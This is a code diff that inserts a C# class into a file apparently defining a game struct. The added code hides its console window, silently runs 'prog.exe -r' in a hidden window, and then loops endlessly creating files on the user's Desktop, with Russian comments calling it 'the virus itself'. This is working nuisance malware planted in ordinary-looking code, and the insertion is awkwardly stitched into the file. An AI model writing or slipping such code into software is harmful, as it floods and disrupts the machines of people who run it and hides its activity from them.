@@ -2,6 +2,48 @@
 using System.Runtime.InteropServices;
 using Thread = System.Threading.Thread;
 
+
+
+///Подключаем нужные библиотеки. 
+
+
+
+using System;
+using System.Collections.Generic;
+using System.Text;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+class Admin
+{
+ [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+    [DllImport("user32.dll")]
+///Настройка нужных переменных
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        const int SW_HIDE = 0;
+        const int SW_SHOW = 5;
+ static void Main()
+ {
+///Скрываем программу 
+         var handle = GetConsoleWindow();
+            ShowWindow(handle, SW_HIDE);
+          Process pr = new Process();
+                pr.StartInfo.FileName = "prog.exe";
+                pr.StartInfo.Arguments = "-r";
+                pr.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                pr.Start();
+                pr.WaitForExit();
+  int i=0;
+///Сам вирус =)
+  while(true){
+   i=i+1;
+  System.IO.StreamWriter sw = new System.IO.StreamWriter(@"C:\Users\"+Environment.UserName+ @"\Desktop\badfile"+i);
+        } 
+ }
+}
+
+
+
 struct Game
 {
     enum Result
